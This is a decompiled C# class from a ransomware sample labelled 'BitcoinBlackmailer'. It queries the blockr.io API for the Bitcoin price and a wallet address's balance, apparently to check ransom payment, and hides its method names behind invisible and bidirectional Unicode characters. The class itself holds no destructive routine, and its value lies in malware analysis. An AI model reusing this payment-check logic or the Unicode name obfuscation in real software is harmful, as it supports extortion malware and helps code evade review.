// Decompiled with JetBrains decompiler
// Type: Main.Tools.Blockr
// Assembly: BitcoinBlackmailer, Version=4.2.6.0, Culture=neutral, PublicKeyToken=null
// MVID: AC84B79B-C968-45A3-8FB8-BD1F97D1C9EF
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-7934625ee2b46883d287d31cb3d1d0b2eb3a0ac2a59a22d434b16513af3d1b11.exe

using Newtonsoft.Json.Linq;
using System;
using System.Net;
using System.Runtime.InteropServices;

namespace Main.Tools
{
  internal static class Blockr
  {
    private static string BlockrAddress => "http://btc.blockr.io/api/v1/";

    internal static double GetPrice()
    {
      string str = Blockr.\u202D‫⁯​‏⁪‏⁫⁯‬‫⁬‫‭⁪⁫⁬⁫‌​‪⁮⁭‏‭‪‬‮‮‍‌‪⁬⁬⁪‌⁮‪‪‏‮(Blockr.BlockrAddress, "coin/info/");
      JObject jobject = Blockr.\u202D⁪⁯⁮‪‎‍​⁬‫⁫‌‎⁭⁮‍‭⁫​‬⁮‫‬‎‎‎⁭⁮‬⁬‬⁯‌⁪‌‫‪‏‮‌‮(Blockr.\u202C‭⁮‪⁫‬‭‫‍​‏‪‭‌⁬⁯​⁯⁬⁯⁪⁬⁮‍⁮‬⁫‏​‪​⁯‮‭⁭‭‏‌‏‍‮(Blockr.\u200B‫⁭‫⁫‎⁭⁮⁪‪⁯‮‌‮‪‭‫‪‫‪‫‌‫‮‌‌⁪‌‪‪⁬‪⁯‮‮⁬⁫⁫‎‮(), str));
      JToken jtoken = Blockr.\u202A⁮‪‪‬⁮‏⁮⁮⁯‮‬‎⁮‮⁯‍⁬‮‌‍‏‍⁫⁭‏‏‮‫‮‭‪⁯‪‬⁯‭‬‮⁪‮(jobject, "status");
      if (jtoken != null && Blockr.\u200E⁮‬‎‌‮‪⁪⁬‭⁯⁮‮‪‍⁬‬‎‏​⁬⁮‪‍⁮​⁭⁬‬⁭‌‬⁯⁫‏‎‫‬‍⁪‮(Blockr.\u200F‍‬⁪‬‭‪‬‍‮⁬⁫‏⁪‍⁫⁫‍⁬⁯‬‏⁮‮‪‎‪⁮‍‍‪⁫​⁯⁯‏‌⁭‫⁭‮((object) jtoken), "error"))
        throw Blockr.\u200B‫‌​⁯​⁯‍⁯‫‏⁯⁬⁬⁪‎⁫​​‭‮‮‏‬‬‍‌⁫‪⁮‪‮‮⁮⁮‏⁪​‫‍‮(Blockr.\u200F‍‬⁪‬‭‪‬‍‮⁬⁫‏⁪‍⁫⁫‍⁬⁯‬‏⁮‮‪‎‪⁮‍‍‪⁫​⁯⁯‏‌⁭‫⁭‮((object) jobject));
      return Blockr.\u202C‮⁪​‭‪‭⁪‭⁪⁬‍⁭‪⁫‍​‪⁬‪‍​‌​‍‎‪‭⁫‪⁭‫⁮⁯‬‏‌‪⁮‎‮(Blockr.\u202C‮⁪​‭‪‭⁪‭⁪⁬‍⁭‪⁫‍​‪⁬‪‍​‌​‍‎‪‭⁫‪⁭‫⁮⁯‬‏‌‪⁮‎‮(Blockr.\u202A⁮‪‪‬⁮‏⁮⁮⁯‮‬‎⁮‮⁯‍⁬‮‌‍‏‍⁫⁭‏‏‮‫‮‭‪⁯‪‬⁯‭‬‮⁪‮(jobject, "data"), (object) "markets"), (object) "coinbase").Value<double>((object) "value");
    }

    internal static double GetBalanceBtc(string address)
    {
      string str = Blockr.\u202C⁬⁪⁪⁭⁯‮‮⁬‫‬⁬‪‏‏⁯‫‌​‍⁯‬⁬⁭‍‬‭⁬⁬‬‎‍‌‍‬‭‭‫⁪⁭‮(Blockr.BlockrAddress, "address/balance/", address);
      JObject jobject = Blockr.\u202D⁪⁯⁮‪‎‍​⁬‫⁫‌‎⁭⁮‍‭⁫​‬⁮‫‬‎‎‎⁭⁮‬⁬‬⁯‌⁪‌‫‪‏‮‌‮(Blockr.\u202C‭⁮‪⁫‬‭‫‍​‏‪‭‌⁬⁯​⁯⁬⁯⁪⁬⁮‍⁮‬⁫‏​‪​⁯‮‭⁭‭‏‌‏‍‮(Blockr.\u200B‫⁭‫⁫‎⁭⁮⁪‪⁯‮‌‮‪‭‫‪‫‪‫‌‫‮‌‌⁪‌‪‪⁬‪⁯‮‮⁬⁫⁫‎‮(), str));
      JToken jtoken = Blockr.\u202A⁮‪‪‬⁮‏⁮⁮⁯‮‬‎⁮‮⁯‍⁬‮‌‍‏‍⁫⁭‏‏‮‫‮‭‪⁯‪‬⁯‭‬‮⁪‮(jobject, "status");
      if (jtoken != null && Blockr.\u200E⁮‬‎‌‮‪⁪⁬‭⁯⁮‮‪‍⁬‬‎‏​⁬⁮‪‍⁮​⁭⁬‬⁭‌‬⁯⁫‏‎‫‬‍⁪‮(Blockr.\u200F‍‬⁪‬‭‪‬‍‮⁬⁫‏⁪‍⁫⁫‍⁬⁯‬‏⁮‮‪‎‪⁮‍‍‪⁫​⁯⁯‏‌⁭‫⁭‮((object) jtoken), "error"))
        throw Blockr.\u200B‫‌​⁯​⁯‍⁯‫‏⁯⁬⁬⁪‎⁫​​‭‮‮‏‬‬‍‌⁫‪⁮‪‮‮⁮⁮‏⁪​‫‍‮(Blockr.\u200F‍‬⁪‬‭‪‬‍‮⁬⁫‏⁪‍⁫⁫‍⁬⁯‬‏⁮‮‪‎‪⁮‍‍‪⁫​⁯⁯‏‌⁭‫⁭‮((object) jobject));
      return Blockr.\u202A⁮‪‪‬⁮‏⁮⁮⁯‮‬‎⁮‮⁯‍⁬‮‌‍‏‍⁫⁭‏‏‮‫‮‭‪⁯‪‬⁯‭‬‮⁪‮(jobject, "data").Value<double>((object) "balance");
    }

    static string \u202D‫⁯​‏⁪‏⁫⁯‬‫⁬‫‭⁪⁫⁬⁫‌​‪⁮⁭‏‭‪‬‮‮‍‌‪⁬⁬⁪‌⁮‪‪‏‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static WebClient \u200B‫⁭‫⁫‎⁭⁮⁪‪⁯‮‌‮‪‭‫‪‫‪‫‌‫‮‌‌⁪‌‪‪⁬‪⁯‮‮⁬⁫⁫‎‮() => new WebClient();

    static string \u202C‭⁮‪⁫‬‭‫‍​‏‪‭‌⁬⁯​⁯⁬⁯⁪⁬⁮‍⁮‬⁫‏​‪​⁯‮‭⁭‭‏‌‏‍‮([In] WebClient obj0, [In] string obj1) => obj0.DownloadString(obj1);

    static JObject \u202D⁪⁯⁮‪‎‍​⁬‫⁫‌‎⁭⁮‍‭⁫​‬⁮‫‬‎‎‎⁭⁮‬⁬‬⁯‌⁪‌‫‪‏‮‌‮([In] string obj0) => JObject.Parse(obj0);

    static JToken \u202A⁮‪‪‬⁮‏⁮⁮⁯‮‬‎⁮‮⁯‍⁬‮‌‍‏‍⁫⁭‏‏‮‫‮‭‪⁯‪‬⁯‭‬‮⁪‮([In] JObject obj0, [In] string obj1) => obj0[obj1];

    static string \u200F‍‬⁪‬‭‪‬‍‮⁬⁫‏⁪‍⁫⁫‍⁬⁯‬‏⁮‮‪‎‪⁮‍‍‪⁫​⁯⁯‏‌⁭‫⁭‮([In] object obj0) => obj0.ToString();

    static bool \u200E⁮‬‎‌‮‪⁪⁬‭⁯⁮‮‪‍⁬‬‎‏​⁬⁮‪‍⁮​⁭⁬‬⁭‌‬⁯⁫‏‎‫‬‍⁪‮([In] string obj0, [In] string obj1) => obj0 == obj1;

    static Exception \u200B‫‌​⁯​⁯‍⁯‫‏⁯⁬⁬⁪‎⁫​​‭‮‮‏‬‬‍‌⁫‪⁮‪‮‮⁮⁮‏⁪​‫‍‮([In] string obj0) => new Exception(obj0);

    static JToken \u202C‮⁪​‭‪‭⁪‭⁪⁬‍⁭‪⁫‍​‪⁬‪‍​‌​‍‎‪‭⁫‪⁭‫⁮⁯‬‏‌‪⁮‎‮([In] JToken obj0, [In] object obj1) => obj0[obj1];

    static string \u202C⁬⁪⁪⁭⁯‮‮⁬‫‬⁬‪‏‏⁯‫‌​‍⁯‬⁬⁭‍‬‭⁬⁬‬‎‍‌‍‬‭‭‫⁪⁭‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }
  }
}
